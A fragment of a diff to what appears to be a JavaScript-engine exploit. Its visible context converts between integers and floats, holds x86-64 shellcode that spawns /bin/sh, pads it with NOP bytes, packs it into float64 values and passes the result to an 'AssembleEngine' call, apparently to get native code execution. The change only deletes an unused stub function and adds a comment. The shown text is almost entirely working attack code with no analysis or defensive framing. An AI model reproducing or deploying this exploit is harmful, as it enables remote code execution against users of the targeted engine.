@@ -13,14 +13,6 @@ function itof(val) {
   return f64_buf[0];
 }
 
-function sToFloat(s) {
-    let res = 0;
-    for (let c of s) {
-
-    }
-    return 12.0
-}
-
 var shellcode = [0x31,0xc0,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05];
 while(shellcode.length % 8 != 0) {
     shellcode.push(0x90);
@@ -33,6 +25,7 @@ for (let i = 0; i < shellcode.length; i++) {
         payload.push(f64_buf[0]);
     }
 }
+// Get the last one pushed
 payload.push(f64_buf[0]);
 
 AssembleEngine(payload);
